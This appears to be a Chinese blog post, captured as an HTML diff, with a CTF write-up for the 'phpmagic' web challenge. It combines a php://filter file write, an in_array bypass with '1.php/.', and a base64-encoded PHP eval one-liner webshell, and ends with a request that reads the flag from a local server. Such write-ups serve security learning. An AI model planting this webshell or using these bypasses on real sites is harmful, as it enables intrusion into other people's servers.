+<h1 id="Codebeaking-phpmagic"><a href="#Codebeaking-phpmagic" class="headerlink" title="Codebeaking-phpmagic"></a>Codebeaking-phpmagic</h1><p><img src="./4.png" srcset="/img/loading.gif" alt=""><br>代码功能主要通过<code>dig -t A -q</code>对输入的<code>domain</code>网址进行dns解析。但是我们的目的是写入shell得到flag。本来想着看是否能够绕过<code>escapeshellarg</code>达到<code>getshell</code>目的，可能太渣没有发现绕过的方法。</p>
+<p>目光转到了写入文件<code>file_put_contents($log_name, $output);</code>很容易想到使用<code>php伪协议</code>，发现log_name是由<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>和<code>$log_name</code>拼接而成。当开启<code>UseCanonicalName=ON</code>和<code>ServerName</code>，可以通过客户端控制。<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p>
+<p><code>logname</code>被<code>in_array</code>白名单强判断，需要绕过。这里参考<br><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a><br>php会对 <code>1.php/.</code> 解析为<code>1.php</code>。且这里<code>1.php/.</code>也能绕过<code>in_array</code>判断</p>
+<p><img src="./6.png" srcset="/img/loading.gif" alt=""><br><code>out_put</code>被<code>htmlspecialchars</code>实体编码直接写入一句话会被转义,这里就可以使用<code>base64一句话木马进行getshell</code>。</p>
+<p>NOTIC:尽量使得<code>webshell</code>满足3的整数倍注意base64之后的一句话不要带有<code>&quot;=&quot;</code> 否则会读取失败</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">456</span>]);<span class="hljs-comment">/*....  =》 PD9waHAgQGV2YWwoJF9HRVRbNDU2XSk7LyouLi4u</span></code></pre>
+
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8082</span><span class="hljs-regexp">/data/</span><span class="hljs-number">2</span>ff4fb82e497844a03adf28cf6bedfde<span class="hljs-regexp">/7.php?456=print_r(scandir(%27../</span>..<span class="hljs-regexp">/../</span>%<span class="hljs-number">27</span>));highlight_file(%<span class="hljs-number">27</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/flag_phpmag1c_ur1%27);</span></code></pre>
+
+<p><img src="./8.png" srcset="/img/loading.gif" alt=""></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a><br><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/03/24/preg-match%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">preg_match函数绕过</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/03/22/phpMyAdmin%E5%90%8E%E5%8F%B0LFI-RCE/">
+                        <span class="hidden-mobile">phpMyAdmin后台LFI->RCE</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
     </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
 
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
+      </div>
+    
   </div>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
+<!-- Custom -->
+
+
     
-    
-    2016-2020
-    osword
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
   </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </nav>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
   </div>
 </footer>
 
-    </div>
-    <!-- styles -->
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<!-- Plugins -->
 
-
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
-
-
-    <!-- jquery -->
-
-<script src="/lib/jquery/jquery.min.js"></script>
-
-
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-
-<!-- clipboard -->
 
   
-<script src="/lib/clipboard/clipboard.min.js"></script>
+    <script  src="/js/lazyload.js" ></script>
+  
 
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
       }
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功!");
-      e.clearSelection();
-    })
-  })
   </script>
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "php://filter编码绕过&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
 
-<!-- Google Analytics -->
 
-<!-- Baidu Analytics -->
 
-<!-- Disqus Comments -->
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 </body>
